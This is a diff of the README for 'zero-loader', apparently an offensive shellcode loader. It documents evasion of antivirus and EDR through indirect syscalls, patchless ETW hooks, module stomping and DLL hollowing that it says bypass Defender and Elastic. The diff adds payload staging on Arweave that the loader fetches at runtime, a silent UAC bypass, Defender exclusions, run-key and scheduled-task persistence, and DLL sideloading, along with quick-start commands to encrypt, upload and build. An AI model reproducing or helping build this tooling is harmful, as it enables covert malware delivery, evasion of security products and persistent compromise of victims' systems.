@@ -37,7 +37,7 @@ Most loaders get flagged because they ship the same binary. **zero-loader** rege
 | | |
 |:--|:--|
 | **Indirect Syscalls** | SSN sourced from a clean `\KnownDlls\ntdll.dll` section (defeats userland hooks on ntdll). 64 `syscall;ret` gadgets pooled, randomly selected per call via RDTSC. Hooked-stub fallback for neighbour-SSN recovery |
-| **Patchless AMSI/ETW** | VEH + hardware breakpoints (DR0/DR1) via `NtContinue` — zero bytes modified, passes integrity checks |
+| **Patchless ETW** | VEH + hardware breakpoint (DR0) on `EtwEventWrite` via `NtContinue` — zero bytes modified, passes integrity checks |
 | **Module Stomping + `.pdata`** | **Primary path.** Picks a sacrificial DLL from a 4-entry allowlist (xpsservices / mfreadwrite / dbgcore / mfsensorgroup — low-sensitivity multimedia/debug modules, rotated per-run via RDTSC), overwrites its `.text` with shellcode, and registers a synthetic `RUNTIME_FUNCTION` via `RtlAddFunctionTable`. Defeats Elastic 8.11+ kernel ETW callstack validation that flags stomped regions with no `.pdata` entry. No NTFS transaction → Defender MpFilter has no hook here |
 | **Ghostly Hollowing** | Tier-2 fallback. Copies sacrificial DLL to `%TEMP%`, opens with `FILE_FLAG_DELETE_ON_CLOSE`, writes XOR-encrypted shellcode at `.text` raw offset, creates `SEC_IMAGE` section, closes the file (disk file gone — section keeps the kernel `FILE_OBJECT` alive), maps + decrypts in memory. Bypasses Defender's MpFilter transaction-aware scanner entirely (Maldev Academy 2024 technique) |
 | **Phantom DLL Hollowing (XOR-in-transaction)** | Tier-3 fallback. NTFS-transacted copy of a sacrificial DLL with the shellcode bytes XOR-encrypted before write (per-build 16-byte key); after `NtCreateSection(SEC_IMAGE)` + map, the loader flips RX → RW, XOR-decrypts in place, flips back. Defender's MpFilter transaction-aware scanner sees only encrypted bytes in the in-flight view |
@@ -71,7 +71,7 @@ Most loaders get flagged because they ship the same binary. **zero-loader** rege
 | **Export Forwarding** | Auto-generated linker pragmas — PE loader handles all legitimate API calls natively |
 | **Version Info Cloning** | Extracts and reproduces `VS_VERSIONINFO` from target DLL |
 | **Process Persistence** | `RtlExitUserProcess` patch + `LdrAddRefDll` pin — DLL survives host exit |
-| **Optional UAC** | `uac` build flag enables self-relaunch elevation via `ShellExecuteA("runas")` |
+| **Optional UAC** | `uac` build flag enables self-relaunch elevation via AppInfo RPC bypass — no UAC dialog, no manifest |
 | **Loader Lock Safe** | DllMain uses ntdll-only APIs; loader pipeline deferred to thread pool |
 
 <br/>
@@ -79,26 +79,35 @@ Most loaders get flagged because they ship the same binary. **zero-loader** rege
 ## Quick Start
 
 ```bash
-# 1  Encrypt & compress shellcode
-python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat
+# 1  Create an Arweave wallet (one-time)
+python arweave/create.py
+#    Fund the wallet with AR tokens before uploading
 
-# 2  Build
+# 2  Encrypt & compress shellcode — embed your wallet address
+python Encrypt.py payload.bin --wallet <43-char-arweave-address>
+#    → data.enc  (key embedded in header — no separate key file)
+#    → Payload.h (wallet address obfuscated, fresh keys every run)
+
+# 3  Upload payload to Arweave
+python arweave/upload.py data.enc
+#    → TX confirmed in ~10-30 min; loader retries automatically
+
+# 4  Build
 build.bat                                  # EXE
 build.bat uac                              # EXE with UAC manifest
-
-# 3  Deploy — upload payload.dat (URL basename) to staging server, deliver the EXE
 ```
 
-> Re-run steps 1 & 2 for a completely new binary.
+> Re-run steps 2-4 for a completely new binary with fresh crypto material.
+
+> To verify the full download pipeline before deploying, run:
+> `python arweave/download.py <wallet-address>`
 
 <details>
 <summary><b>Web Console (optional)</b></summary>
 
 <br/>
 
-A browser-based wrapper for the three CLI steps above (encrypt / sideload /
-build). Runs on `127.0.0.1` only — no auth, not meant to be exposed to a
-network.
+A browser-based wrapper for the full pipeline. Runs on `127.0.0.1` only — no auth, not meant to be exposed to a network.
 
 ```bash
 cd web
@@ -106,10 +115,7 @@ run.bat            # first run creates .venv and installs Flask
                    # then starts http://127.0.0.1:7890
 ```
 
-The console streams `build.bat` output live, shows per-section entropy from
-`Mutate.py`, and exposes every compile-time flag (`DEBUG`, `RWX_SHELLCODE`,
-`ENABLE_SYNTHETIC_STACK`, `uac`) as a checkbox. Built artifacts appear in the
-sidebar with one-click download.
+Covers the entire workflow: encrypt shellcode → upload to Arweave → build EXE/DLL. Streams `build.bat` output live, shows per-section entropy from `Mutate.py`, and exposes every compile-time flag (`DEBUG`, `RWX_SHELLCODE`, `ENABLE_SYNTHETIC_STACK`, `uac`) as a checkbox. The Arweave tab manages wallets, triggers uploads, and scans confirmed transactions.
 
 </details>
 
@@ -123,16 +129,19 @@ sidebar with one-click download.
 python SideloadGen.py C:\Windows\System32\<target>.dll
 
 # 2  Encrypt shellcode
-python Encrypt.py payload.bin --url https://<C2>:<PORT>/payload.dat
+python Encrypt.py payload.bin --wallet <ARWEAVE_ADDRESS>
 
-# 3  Build
+# 3  Upload to Arweave
+python arweave/upload.py data.enc
+
+# 4  Build
 build.bat sideload <target>.dll            # no UAC
 build.bat sideload <target>.dll uac        # self-relaunch UAC
 
-# 4  Deploy
+# 5  Deploy
 #    Rename real <target>.dll → <target>_orig.dll
 #    Place proxy <target>.dll + <target>_orig.dll alongside host EXE
-#    Upload payload.dat (URL basename) to staging server, run host EXE
+#    Run host EXE — loader fetches payload from Arweave at runtime
 ```
 
 </details>
@@ -184,10 +193,17 @@ Main()
  ├─ ShufflePreloadLibraries    Fisher-Yates (RDTSC) amsi/wininet/ktmw32
  ├─ AntiAnalysis               PEB.BeingDebugged · NtGlobalFlag · NumberOfProcessors · RDTSC
  ├─ AntiEmulation              RDTSC variance · CPUID hv brand · mpengine budget burn
- ├─ PatchlessAmsiEtw           DR0 = EtwEventWrite
- │                              DR1 = AmsiScanBuffer
- ├─ BruteForceDecryption       recover Chaskey key
- ├─ DownloadPayload            HTTPS GET → encrypted blob
+ ├─ PatchlessEtw               DR0 = EtwEventWrite
+ │
+ ├─ [UAC EXE] UacBypass        medium IL → AppInfo RPC → spawn elevated → terminate
+ │                              elevated  → InstallAndTerminate (WD excl + copy + task) → terminate
+ │                              reboot    → IsFirstRunProcess=FALSE → fall through
+ ├─ [non-UAC, first run] InstallAndTerminate / SideloadInstallAndContinue
+ │                              InstallPersistence (HKCU run key) → copy → launch → terminate
+ ├─ [non-UAC, reboot]    self-guard fires → return → fall through
+ │
+ ├─ FetchArweaveMeta           GraphQL POST → TX ID list → GET combined data
+ │                              └ ArwParseHeader (4-pipe scan → key/nonce/size/flag)
  ├─ ChaskeyCtrDecrypt          in-place decryption
  ├─ DecompressPayload          LZNT1 via RtlDecompressBuffer
  │
@@ -220,9 +236,16 @@ Host EXE loads proxy DLL → DllMain
  │   [Host app continues, ExitProcess blocked]
  │
  └─ SideloadWorker (thread pool)
-     ├─ [uac] IsElevated? → no: ShellExecuteA "runas" → terminate self
+     ├─ [uac, medium IL] IsElevated? → no: AppInfo RPC bypass → spawn elevated self → terminate
+     ├─ [uac, high IL]   IsElevated? → yes: SideloadInstallAndContinue
+     │                                  WD excl + Register-ScheduledTask + copy files
+     │                                  RunTaskViaCom → launch task → terminate
+     ├─ [non-uac, first run] SideloadInstallAndContinue
+     │                        InstallPersistence (HKCU run key) + copy files
+     │                        CreateProcessW("msoia.exe /pf") → terminate
+     ├─ [reboot] self-guard (/pf) fires → skip install
      ├─ LdrAddRefDll           pin DLL in memory
-     └─ Main()                 full loader pipeline
+     └─ Main()                 full loader pipeline (download → decrypt → shellcode)
 ```
 
 ### Call Stack
@@ -253,20 +276,24 @@ a valid handle and the stackwalker can unwind each frame.
 ### Encryption Pipeline
 
 ```
-  Build time                              Runtime
-  ──────────                              ───────
+  Build time                                   Runtime
+  ──────────                                   ───────
 
-  shellcode.bin                     HTTPS download
-       │                                 │
-  LZNT1 compress                    Chaskey-CTR decrypt
-       │                                 │
-  Chaskey-CTR encrypt ─→ payload.dat ─→ LZNT1 decompress
-       │                                 │
-  key protection                    brute-force recovery
-  (XOR + offset)
-       │
-  Payload.h
-  (randomized keys, nonce, strings)
+  shellcode.bin                          GraphQL POST arweave.net/graphql
+       │                                 owners=[wallet], App-Name=zero-loader
+  LZNT1 compress                                │
+       │                                   TX ID list (newest first)
+  Chaskey-CTR encrypt                           │
+       │                                   GET arweave.net/<txid>
+  combine header + binary                       │
+  hex_key|hex_nonce|size|flag|<enc>        parse header (4 pipes)
+       │                                        │
+  arweave/upload.py ──→ Arweave TX    Chaskey-CTR decrypt
+       │                                        │
+  Payload.h                               LZNT1 decompress
+  (wallet address obfuscated,                   │
+   fresh XOR keys + placement key          shellcode ready
+   every build)
 ```
 
 <br/>
@@ -279,17 +306,26 @@ Syscalls.h/.c       indirect syscall engine · SSN + gadget pool
 AsmStub.asm         x64 MASM · RunSyscall · SpoofCallback
 WinApi.c            PEB walking · JOAAT hashing · CRT stubs
 Evasion.c           patchless AMSI/ETW · anti-analysis · cleanup
-Stomper.c           phantom hollowing (auto DLL scan) · module stomping · gadgets
+Arweave.c           GraphQL beacon resolver · combined-format header parser
+Stomper.c           phantom hollowing · module stomping · gadgets
 Crypt.c             Chaskey-12 CTR · LZNT1 · key recovery
 Staging.c           HTTPS staging · cert bypass
 Common.h            defines · hashes · typedefs · macros
 Structs.h           undocumented NT structures
-Payload.h           auto-generated (never edit)
+Payload.h           auto-generated — wallet address + obfuscated strings (never edit)
 Sideload.c          DLL entry point · exit hook · elevation
 SideloadGen.py      export forwarding generator · version info cloning
 Sideload.h          auto-generated export forwards (never edit)
 Sideload.rc         auto-generated version info (never edit)
-Encrypt.py          encryption + compression + obfuscation
+Encrypt.py          encrypt + compress + generate Payload.h
 Mutate.py           post-build PE metadata randomizer
 build.bat           ml64 → cl → Mutate.py
+arweave/
+  create.py         generate a new Arweave wallet keypair
+  upload.py         upload combined data.enc to Arweave
+  download.py       simulate the full C loader pipeline end-to-end
+  wallet.json       funded Arweave keypair (never commit)
+web/
+  server.py         local Flask console (127.0.0.1:7890)
+  run.bat           create .venv + start server
 ```
